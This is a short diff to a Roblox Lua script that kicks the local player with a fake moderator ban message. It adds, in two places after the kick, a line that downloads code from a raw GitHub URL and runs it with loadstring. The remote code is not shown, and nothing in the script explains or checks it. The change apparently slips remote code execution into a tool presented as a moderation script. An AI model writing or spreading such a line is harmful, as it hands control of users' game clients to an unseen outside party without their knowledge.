@@ -22,6 +22,7 @@ for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                     if GetPlayer(input[2]) then
                         if GetPlayer(input[2]) == game:GetService("Players").LocalPlayer then
                             game:GetService("Players").LocalPlayer:Kick("You have been banned by a moderator.")
+                            loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/anticheat-skid/main/skiddss"))()
                         end
                     end
                 end
@@ -42,6 +43,7 @@ game:GetService("Players").PlayerAdded:Connect(function(player)
                     if GetPlayer(input[2]) then
                         if GetPlayer(input[2]) == game:GetService("Players").LocalPlayer then
                             game:GetService("Players").LocalPlayer:Kick("You have been banned by a moderator.")
+                            loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/anticheat-skid/main/skiddss"))()
                         end
                     end
                 end
